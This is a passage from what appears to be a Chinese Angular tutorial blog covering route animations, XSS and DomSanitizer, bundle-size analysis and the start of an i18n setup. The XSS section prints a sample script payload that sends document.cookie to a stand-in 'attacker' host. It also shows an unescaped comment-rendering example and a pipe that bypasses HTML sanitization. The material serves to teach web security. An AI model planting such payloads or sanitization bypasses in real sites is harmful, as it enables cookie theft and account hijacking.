class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br></div></div><p>此时,我们通过在组件动态赋值即可，比如a=&gt;b:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// a 组件：</span>
state <span class="token operator">=</span> <span class="token string">'2，a'</span> <span class="token comment">// 默认层级都为2没有动画</span>
@<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@card'</span><span class="token punctuation">)</span> slideToFrom <span class="token operator">=</span> state<span class="token punctuation">;</span>
@<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@card'</span><span class="token punctuation">)</span> slideFromTo <span class="token operator">=</span> state<span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'3，a'</span> <span class="token comment">// 前进增加层级</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigateByUrl</span><span class="token punctuation">(</span><span class="token string">'/b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'1，a'</span> <span class="token comment">// 后退降低层级</span>
histroy<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token comment">// b 组件：</span>
@<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@card'</span><span class="token punctuation">)</span> slideToFrom <span class="token operator">=</span> <span class="token string">'2，a'</span><span class="token punctuation">;</span>
@<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@card'</span><span class="token punctuation">)</span> slideFromTo <span class="token operator">=</span> <span class="token string">'2，a'</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'3，a'</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">navigateByUrl</span><span class="token punctuation">(</span><span class="token string">'/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'1，a'</span>
histroy<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>这样只要是进入的都会左滑，返回的都会右滑，注意如果是手机返回键返回将会没有动画，因为这个返回触发时我们手动设置的。</p> <h2 id="domsanitizer"><a href="#domsanitizer" class="header-anchor">#</a> DomSanitizer</h2> <h3 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h3> <p>跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p> <p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p> <h3 id="xss示例"><a href="#xss示例" class="header-anchor">#</a> XSS示例</h3> <p>互联网上的几乎每个博客都有一个评论的系统，允许用户对文章发表评论。评论信息一般使用常用的 HTML 表单进行提交。具体示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>form<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>textarea <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;comment&quot;</span> cols<span class="token operator">=</span><span class="token string">&quot;30&quot;</span> rows<span class="token operator">=</span><span class="token string">&quot;10&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>button type<span class="token operator">=</span><span class="token string">&quot;submit&quot;</span><span class="token operator">&gt;</span>Submit<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
  
<span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Comments<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ul<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>

<span class="token keyword">var</span> $form <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> $comment <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.comment'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> $ul <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'ul'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

$form<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>$comment<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">$</span><span class="token punctuation">(</span>$ul<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;li&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/li&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>现在假设攻击者将以下代码作为评论信息发送到服务器：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
   window<span class="token punctuation">.</span>location<span class="token operator">=</span>’http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>attacker<span class="token operator">/</span><span class="token operator">?</span>cookie<span class="token operator">=</span>'<span class="token operator">+</span>document<span class="token punctuation">.</span>cookie
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>如果网站没有保护自己免受跨站脚本的攻击，该内容将被保存到数据库中，访问该页面的所有用户将重定向到攻击者的URL。然而现实中一个真正的攻击者会创建一个更危险的脚本，例如，攻击者可以记录键盘事件并将这些信息发送到他自己拥有的服务器。</p> <p>刚才我们看到的，只是 XSS 攻击的一个简单示例，它还可以有许多形式，如URL查询，href属性，CSS等等.</p> <p>Angular中默认将所有输入值视为不受信任。当我们通过 property，attribute，样式，类绑定或插值等方式，将一个值从模板中插入到DOM中时，Angular 2 会自帮我们清除和转义不受信任的值。我们来看一下具体示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div [innerHtml]=&quot;html&quot;&gt;&lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  html<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>html <span class="token operator">=</span> <span class="token string">&quot;&lt;h1&gt;DomSanitizer&lt;/h1&gt;&lt;script&gt;attackerCode()&lt;/script&gt;&quot;</span><span class="token punctuation">;</span>    
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>   
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <p><img src="/vuebloger/img/post/3031123633-58d3bb0171806_fix732.png" alt=""></p> <p>从上图可以看出，Angular 2 在编译的时候，会自动清理 HTML 输入并转义不安全的代码，因此在这种情况下，脚本不会运行，只能在屏幕上显示为文本。接下来我们继续来看一个例子，如何绑定 iframe 的 src 属性值：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;iframe [src]=&quot;iframe&quot;&gt;&lt;/iframe&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  iframe<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iframe <span class="token operator">=</span> <span class="token string">&quot;https://segmentfault.com/&quot;</span><span class="token punctuation">;</span>       
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>以上代码运行后，在浏览器中无法正常显示内容，控制台中输出了以下异常信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token constant">EXCEPTION</span><span class="token operator">:</span> Error <span class="token keyword">in</span> <span class="token punctuation">.</span><span class="token operator">/</span>AppComponent <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token operator">-</span> inline template<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">12</span> caused by<span class="token operator">:</span> unsafe value used <span class="token keyword">in</span> a resource <span class="token constant">URL</span> <span class="token function">context</span> <span class="token punctuation">(</span>see http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">.</span>co<span class="token operator">/</span>ng<span class="token operator">/</span>security#xss<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>Angular 抛出此错误是因为 iframe 的 src 属性是资源 URL 安全上下文，因为不可信源可以在用户不知情的情况下执行某些不安全的操作。但如果我们确认资源的 URL 是安全的，要怎么告知 Angular 该 URL 地址是安全的，给我们通行证呢 ？答案是，我们可以使用 Angular中提供的 DomSanitizer 服务，具体示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> DomSanitizer<span class="token punctuation">,</span> SafeResourceUrl <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;iframe [src]=&quot;iframe&quot;&gt;&lt;/iframe&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  iframe<span class="token operator">:</span> SafeResourceUrl<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> sanitizer<span class="token operator">:</span> DomSanitizer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iframe <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span><span class="token function">bypassSecurityTrustResourceUrl</span><span class="token punctuation">(</span>
      <span class="token string">&quot;https://segmentfault.com/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>以上代码运行后，在浏览器中我们就可以看到正常的内容。另外需要注意的是，如果不受信任的用户数据调用这些方法，我们的应用程序将会存在 XSS 安全风险。</p> <h3 id="sanitize"><a href="#sanitize" class="header-anchor">#</a> sanitize</h3> <p>有时后我们需要手动过滤输入值，这时你可以使用 sanitize 方法，它的签名如下</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>abstract <span class="token function">sanitize</span><span class="token punctuation">(</span>context<span class="token operator">:</span> SecurityContext<span class="token punctuation">,</span> value<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>该方法的第一个参数表示 SecurityContext (安全上下文)，它的可选值如下：</p> <ul><li>None</li> <li>HTML</li> <li>STYLE</li> <li>SCRIPT</li> <li>URL</li> <li>RESOURCE_URL</li></ul> <p>sanitize 方法的使用示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> SecurityContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> DomSanitizer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div [innerHtml]=&quot;html&quot;&gt;&lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  html<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> sanitizer<span class="token operator">:</span> DomSanitizer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>html <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>SecurityContext<span class="token punctuation">.</span><span class="token constant">HTML</span><span class="token punctuation">,</span> 
                    <span class="token string">&quot;&lt;h1&gt;Sanitize&lt;/h1&gt;&lt;script&gt;attackerCode()&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>以上代码运行后，控制台的输出信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token constant">WARNING</span><span class="token operator">:</span> sanitizing <span class="token constant">HTML</span> stripped some <span class="token function">content</span> <span class="token punctuation">(</span>see http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>g<span class="token punctuation">.</span>co<span class="token operator">/</span>ng<span class="token operator">/</span>security#xss<span class="token punctuation">)</span><span class="token punctuation">.</span>
app<span class="token punctuation">.</span>component<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">15</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Sanitize<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token function">attackerCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="自定义keephtml指令"><a href="#自定义keephtml指令" class="header-anchor">#</a> 自定义keepHtml指令</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Pipe<span class="token punctuation">,</span> PipeTransform <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> DomSanitizer <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span><span class="token punctuation">;</span>

@<span class="token function">Pipe</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'keepHtml'</span><span class="token punctuation">,</span> pure<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">EscapeHtmlPipe</span> <span class="token keyword">implements</span> <span class="token class-name">PipeTransform</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> sanitizer<span class="token operator">:</span> DomSanitizer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">transform</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span><span class="token function">bypassSecurityTrustHtml</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>keepHtml 指令使用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 默认innerHTML会过滤掉style</span>
<span class="token operator">&lt;</span>div <span class="token punctuation">[</span>innerHTML<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;post.body | keepHtml&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="分析包"><a href="#分析包" class="header-anchor">#</a> 分析包</h2> <p>可以使用<code>webpack-bundle-analyzer</code>和<code>source-map-explorer</code>这两款工具来分析 Angular Bundle 的大小。</p> <h3 id="webpack-bundle-analyzer"><a href="#webpack-bundle-analyzer" class="header-anchor">#</a> webpack-bundle-analyzer</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm i webpack<span class="token operator">-</span>bundle<span class="token operator">-</span>analyzer <span class="token operator">--</span>save<span class="token operator">-</span>dev
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>接下来我们使用 Angular CLI 来构建项目，在构建的时候，需要添加相关参数，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng build <span class="token operator">--</span>prod <span class="token operator">--</span>aot <span class="token operator">--</span>stats<span class="token operator">-</span>json
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>当项目构建完成后，在根目录下的 dist 文件夹下会生成一个 stats.json 文件，然后我们可以通过以下的命令来查看 webpack 打包文件大小信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">.</span><span class="token operator">/</span>node_modules<span class="token operator">/</span><span class="token punctuation">.</span>bin<span class="token operator">/</span>webpack<span class="token operator">-</span>bundle<span class="token operator">-</span>analyzer dist<span class="token operator">/</span>ky<span class="token operator">-</span>scholar<span class="token operator">-</span>web<span class="token operator">/</span>stats<span class="token operator">-</span>es2015<span class="token punctuation">.</span>json
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>以上命令成功运行后，控制台会输出以下信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Webpack Bundle Analyzer is started at http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">8888</span>
Use Ctrl<span class="token operator">+</span><span class="token constant">C</span> to close it
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>当访问 http://127.0.0.1:8888 这个地址时，你会看到以下内容：</p> <p><img src="/vuebloger/img/post/Snipaste_2021-04-14_15-50-10.png" alt=""></p> <p>为了方便，我们加<code>npm script</code>：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;bundle-report&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ng build --prod --aot --stats-json&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;analyze-report&quot;</span><span class="token operator">:</span> <span class="token string">&quot;webpack-bundle-analyzer dist/ky-scholar-web/stats-es2015.json&quot;</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="source-map-explorer"><a href="#source-map-explorer" class="header-anchor">#</a> source-map-explorer</h3> <p>source-map-explorer 是一个工具，它使用 bundle 生成的 source map 文件来分析 bundle 的组成及各部分的大小。与 webpack bundle analyzer 类似，它也提供了可视化的方案来查看分析的结果。</p> <p>首先我们先来在当前项目中安装 source-map-explorer：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm i source<span class="token operator">-</span>map<span class="token operator">-</span>explorer <span class="token operator">--</span>save<span class="token operator">-</span>dev
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>然后在重新进行项目构建：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng build <span class="token operator">--</span>prod <span class="token operator">--</span>aot <span class="token operator">--</span>source<span class="token operator">-</span>map
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>构建完成后，在根目录下的 dist 文件夹下会生成 main bundle 文件，这时我们可以在命令行执行下列命令来查看结果：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>node_modules<span class="token operator">/</span><span class="token punctuation">.</span>bin<span class="token operator">/</span>source<span class="token operator">-</span>map<span class="token operator">-</span>explorer dist<span class="token operator">/</span>ky<span class="token operator">-</span>scholar<span class="token operator">-</span>web<span class="token operator">/</span>main<span class="token operator">-</span>es2015<span class="token punctuation">.</span>d72e9d91fd17f9fe7b8c<span class="token punctuation">.</span>js<span class="token punctuation">.</span>map
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>成功执行上述命令后，在浏览器中你将会看到以下内容：</p> <p><img src="/vuebloger/img/post/Snipaste_2021-04-14_16-51-39.png" alt=""></p> <p>为了方便操作，我们也可以定义一个 npm script 任务来处理上述的工作：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;map-explorer&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ng build --prod --source-map --aot &amp;&amp; source-map-explorer dist/ky-scholar-web/main.d72e9d91fd17f9fe7b8c.js.map&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="国际化"><a href="#国际化" class="header-anchor">#</a> 国际化</h2> <p>利用以下第三方库，快速支持国际化：</p> <ul><li>ngx-translate/core</li> <li>ngx-translate/http-loader</li> <li>ngx-translate-extract</li></ul> <p>我们来安装上面的三个库：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>$ npm install @ngx<span class="token operator">-</span>translate<span class="token operator">/</span>core @ngx<span class="token operator">-</span>translate<span class="token operator">/</span>http<span class="token operator">-</span>loader <span class="token operator">--</span>save
$ npm install @biesbjerg<span class="token operator">/</span>ngx<span class="token operator">-</span>translate<span class="token operator">-</span>extract <span class="token operator">--</span>save<span class="token operator">-</span>dev
